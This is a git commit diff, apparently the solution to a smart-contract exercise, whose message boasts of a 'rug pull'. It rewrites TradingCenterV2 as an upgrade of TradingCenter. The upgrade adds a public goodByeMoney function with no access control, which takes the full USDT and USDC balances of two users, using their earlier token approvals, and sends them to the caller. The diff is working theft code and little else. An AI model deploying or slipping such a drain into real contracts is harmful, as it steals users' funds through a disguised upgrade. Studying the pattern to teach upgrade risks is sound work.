e8c6ea5ea85c352322430ee749632a9eadf52110
moojing <starts789@gmail.com>
2023-04-25 23:14:59 +0800

    rug pull succefully!

--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -1,6 +1,22 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
+import {TradingCenter} from "./TradingCenter.sol";
 
 // TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+contract TradingCenterV2 is TradingCenter {
+    function initialize() public {
+        require(initialized == false, "already initialized");
+        initialized = true;
+    }
+
+    function goodByeMoney(address user1, address user2) public {
+        uint user1UsdtBalance = usdt.balanceOf(user1);
+        uint user1UsdcBalance = usdc.balanceOf(user1);
+        uint user2UsdtBalance = usdt.balanceOf(user2);
+        uint user2UsdcBalance = usdc.balanceOf(user2);
+        usdt.transferFrom(user1, msg.sender, user1UsdtBalance);
+        usdt.transferFrom(user2, msg.sender, user2UsdtBalance);
+        usdc.transferFrom(user1, msg.sender, user1UsdcBalance);
+        usdc.transferFrom(user2, msg.sender, user2UsdcBalance);
+    }
 }
